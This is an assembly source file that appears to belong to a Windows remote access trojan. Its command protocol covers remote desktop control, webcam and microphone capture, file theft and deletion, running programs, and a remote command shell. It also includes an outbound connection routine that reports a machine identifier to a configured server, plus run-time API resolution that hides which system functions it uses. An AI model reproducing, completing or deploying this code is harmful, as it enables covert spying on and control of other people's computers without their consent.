
include			WINDOWS.INC
include			debug.inc
include 		kernel32.inc
include			ws2_32.inc
include			user32.inc
include			gdi32.inc

includelib		kernel32.lib
includelib		ws2_32.lib
includelib		user32.lib
includelib		gdi32.lib
include			lz.asm

WSABUF STRUCT
  	len  		dword		?
  	buf  		dword 		?
WSABUF ENDS

OVERLAPPEDPLUS	struct
	ol			OVERLAPPED	<?>
	wsabuf		WSABUF		<?>
	hsocket		dword		?
	opCode		dword		?
	lpBuffer	dword		?	
	dwLength	dword		?
	socktag		dword		?
	dwSeek		dword		?
	other		dword		?
	nfree		dword		?
	otherfree	dword		?
	dwport		dword		?
	hcpumutex	dword		?

oldhbitmap		dword			?
lpipport    	dword			?
bbmpinit		dword			?
qinxidu			dword			?
desktopsleep	dword			?
dwbmpsize		dword			?
dwbmpksize		dword			?
dwinfosize		dword			?
lpscrbmp		dword			?
lpdstbmp		dword			?
lptmpbmp		dword			?
union
hScrDC			dword			?
hfile			dword			?
hReadPipeHandle		dword			?
ends
union
hMemDC			dword			?
nfilesize		dword			?
hWritePipeHandle	dword			?
ends
union
hBitmap			dword			?
nfileseek		dword			?
hReadPipeShell		dword			?
ends
union
hWaveIn			dword		 	?
hWritePipeShell		dword			?
ends
union
lpWavehdIn		dword		 	?
cmdhthread			dword			?
ends
union
lpRecBuf		dword			?
cmdhprocess			dword			?
ends
union
lpWavehdInone	dword		 	?
cmdhprocthread		dword			?
ends
union
lpRecBufone		dword			?
ends
OVERLAPPEDPLUS ends

SOCKETTAG		STRUCT
	tag				byte		?
	maxconn			byte		?
	desktopconn		byte		?
	desktopsend		byte		?
	desktopxy		byte		?
	desktopldb		byte		?
	desktopldown	byte		?
	desktoprdown	byte		?
	desktoplup		byte		?
	desktoprup		byte		?
	desktopkey		byte		?
	desktopclose	byte		?
	cameraconn		byte		?
	camerasend		byte		?
	cameraclose		byte		?
	recconn			byte		?
	recsend			byte		?
	recclose		byte		?
	fileconn		byte		?
	getfilestr		byte		?
	sendfilestr		byte		?
	fileinfo		byte		?
	gofile			byte		?
	closefile		byte		?
	scfileinfo		byte		?
	scgofile		byte		?
	scclosefile		byte		?
	scgetfilesize	byte		?
	delfile			byte		?
	runexe			byte		?
	cmdstart		byte		?
	cmdrun			byte		?
	cmdclose		byte		?
	biaoshi			byte		?
SOCKETTAG ends

CAPDRIVERCAPS STRUCT
	wDeviceIndex	dword	?
	fHasOverlay	dword	?
	fHasDlgVideoSource	dword	?
	fHasDlgVideoFormat	dword	?
	fHasDlgVideoDisplay	dword	?
	fCaptureInitialized	dword	?
	fDriverSuppliesPalettes	dword	?
	hVideoIn	dword	?
	hVideoOut	dword	?
	hVideoExtIn	dword	?
	hVideoExtOut	dword	?
CAPDRIVERCAPS ends

VIDEOHDR STRUCT
	lpData	dword	?
	dwBufferLength	dword	?
	dwBytesUsed	dword	?
	dwTimeCaptured	dword	?
	dwUser	dword	?
	dwFlags	dword	?
	dwReserved	dword 4 dup(?)
VIDEOHDR ends

.data

szqjip			byte	100  dup(0)

szkernel		byte	"kernel32.dll",0
szadvapi		byte	"Advapi32.dll",0
szwinmm			byte	"winmm.dll",0

.data?
hiocp			dword			 ?
dwipstr			dword		     ?
dwipport		dword			 ?
hCaptureEvent	dword			 ?
hCapture		dword			 ?
bStartCapture	dword			 ?
CameraThreadID	dword			 ?
lpbmi			dword			 ?
dwbmisize		dword			 ?
lpdib			dword			 ?
dwdibsize		dword			 ?
stpoint			POINT			<?>
lpCDName		dword			 ?

lpCreateProcess				dword	?
lpCreateThread				dword	?
lpTerminateThread			dword	?
lpTerminateProcess			dword	?
lpShellExecute				dword	?
lpPostThreadMessage			dword	?
lpwaveInOpen				dword	?
lpwaveInPrepareHeader		dword	?
lpwaveInUnprepareHeader		dword	?
lpwaveInAddBuffer			dword	?
lpwaveInStart				dword	?
lpwaveInReset				dword	?
lpwaveInClose				dword	?

.code

LYQCmpMemory proc uses ebx ecx esi edi lpdest,lpsou,lpsize
	mov esi,lpdest
    mov edi,lpsou
    mov ecx,lpsize
	cld
    repe cmpsb
    .if zero?
    	mov eax,1
    .else
    	mov eax,0	
    .endif
	ret
LYQCmpMemory endp

LYQMoveMemory proc uses ebx ecx esi edi lpdest,lpsou,lpsize
	mov esi,lpsou
	mov edi,lpdest
	mov ecx,lpsize
	cld
	rep movsb
	ret
LYQMoveMemory endp

LYQZeroMemory proc uses ebx ecx esi edi lpdest,lpsize
	xor eax,eax
	mov edi,lpdest
	mov ecx,lpsize
	cld
	rep stosb
	ret
LYQZeroMemory endp

GetCRC32 proc uses ebx ecx esi edi csData,dwSize
    invoke  GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,400h
    mov	edi,eax
    mov	esi,eax
    xor	edx,edx
	@MakeCRC32Loop: 
	mov	eax,edx
    mov	ecx,8
	@MakeLoop:      
	shr	eax,1
    jnc	@MakeNext
    xor	eax,0EDB88320h
	@MakeNext:      
	loop @MakeLoop
    mov [esi],eax
    add esi,4
    inc dl
    jnz @MakeCRC32Loop
    mov eax,-1
    mov ecx,dwSize
    mov esi,csData
    jecxz rest
	@@:            
	movzx edx,al
    xor dl,[esi]
    inc esi
    shr eax,8
    xor eax,[edi+4*edx]
    loop @B
	rest:          
	not eax
    mov esi,eax 
    invoke  GlobalFree,edi
    mov	eax,esi
    ret
GetCRC32 endp

LLGPA	proc uses ebx ecx esi edi lParam,wParam
	invoke LoadLibraryEx,lParam,NULL,NULL
	invoke GetProcAddress,eax,wParam
	ret
LLGPA endp

WSASends	proc uses ebx ecx esi edi hsock,lpbuf,dwLength,Socktag
	LOCAL	@recvbytes,@flags:dword
	LOCAL	@lpBuffer,@dwBufferSize:dword
	mov eax,dwLength
	add eax,10
	mov @dwBufferSize,eax
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,@dwBufferSize
	mov @lpBuffer,eax
	mov edi,eax
	mov eax,dwLength
	mov dword ptr[edi],eax
	mov eax,Socktag
	mov word ptr[edi+4],ax
	invoke GetCRC32,@lpBuffer,6
	mov dword ptr[edi+6],eax
	add edi,10
	invoke LYQMoveMemory,edi,lpbuf,dwLength
	invoke GlobalFree,lpbuf
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,@dwBufferSize
	mov edi,eax
	invoke LYQMoveMemory,edi,@lpBuffer,@dwBufferSize
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,sizeof OVERLAPPEDPLUS
	mov esi,eax
	assume esi:ptr OVERLAPPEDPLUS
	invoke LYQZeroMemory,addr [esi].ol,sizeof OVERLAPPED
	m2m [esi].wsabuf.len,@dwBufferSize
	m2m [esi].dwLength,@dwBufferSize
	m2m [esi].lpBuffer,@lpBuffer
	m2m [esi].hsocket,hsock
	mov [esi].wsabuf.buf,edi
	mov [esi].opCode,3
	mov [esi].dwSeek,0
	mov @recvbytes,0
	mov @flags,0
	invoke WSASend,[esi].hsocket,addr [esi].wsabuf,1,addr @recvbytes,@flags,esi,NULL	
	.if eax==SOCKET_ERROR
		invoke WSAGetLastError
		.if eax!= WSA_IO_PENDING
			mov [esi].otherfree,1
			invoke PostQueuedCompletionStatus,hiocp,0,0,esi
		.endif
	.endif	
	assume esi:nothing
	ret
WSASends endp

Connects	proc uses ebx ecx esi edi
    LOCAL	@stsin:sockaddr_in
	LOCAL	@newsock,@recvbytes,@flags
	assume esi:ptr OVERLAPPEDPLUS
	mov ebx,[esi].lpipport
	mov edi,[esi].dwport
	assume esi:nothing
	invoke htons,edi
	mov @stsin.sin_port,ax
	mov @stsin.sin_addr,ebx
	mov @stsin.sin_family,AF_INET
	mov @stsin.sin_zero,0		
	invoke socket,AF_INET,SOCK_STREAM,NULL
	mov @newsock,eax
	invoke connect,@newsock,addr @stsin,sizeof @stsin
	.if eax==NULL
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,sizeof OVERLAPPEDPLUS
		mov esi,eax
		assume esi:ptr OVERLAPPEDPLUS		
		mov [esi].lpipport,ebx
		invoke CreateIoCompletionPort,@newsock,hiocp,NULL,NULL
		mov [esi].wsabuf.len,10
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,10
		mov [esi].wsabuf.buf,eax
		m2m [esi].hsocket,@newsock
		mov [esi].opCode,1
		mov [esi].dwSeek,0
		mov [esi].socktag,0
		mov [esi].dwLength,10
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,10
		mov [esi].lpBuffer,eax
		mov @recvbytes,0
		mov @flags,0
		invoke WSARecv,@newsock,addr [esi].wsabuf,1,addr @recvbytes,addr @flags,esi,NULL	
		.if eax==SOCKET_ERROR
			invoke WSAGetLastError
			.if eax!= WSA_IO_PENDING
				mov [esi].opCode,0
				invoke PostQueuedCompletionStatus,hiocp,0,0,esi
			.endif
		.endif
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,80
		mov edi,eax
		invoke LYQMoveMemory,edi,lpCDName,80
		invoke WSASends,[esi].hsocket,edi,80,SOCKETTAG.biaoshi
		assume esi:nothing		
	.else
		invoke closesocket,@newsock
		mov @newsock,0
	.endif	     
	mov eax,@newsock
	ret
Connects endp

CreateThread proc uses ebx ecx esi edi lParam,wParam,nParam,mParam,xParam,zParam
	ret
CreateThread endp

CreateProcess proc uses ebx ecx esi edi lParam,wParam,nParam,mParam,xParam,zParam,yParam,aParam,bParam,cParam
	push cParam
	push bParam
	push aParam
	push yParam
	push zParam
	push xParam
	push mParam
	push nParam
	push wParam
	push lParam
	call lpCreateProcess
	ret
CreateProcess endp

PostThreadMessage proc uses ebx ecx esi edi lParam,wParam,nParam,mParam
	@@:
	push mParam
	push nParam
	push wParam
	push lParam
	call lpPostThreadMessage
	.if !eax
		invoke Sleep,7
		jmp @b
	.endif
	ret
PostThreadMessage endp	

CreateThreads proc uses ebx ecx esi edi lParam,wParam,nParam,mParam,xParam,zParam
	push zParam
	push xParam
	push mParam
	push nParam
	push wParam
	push lParam
	call lpCreateThread
	ret
CreateThreads endp
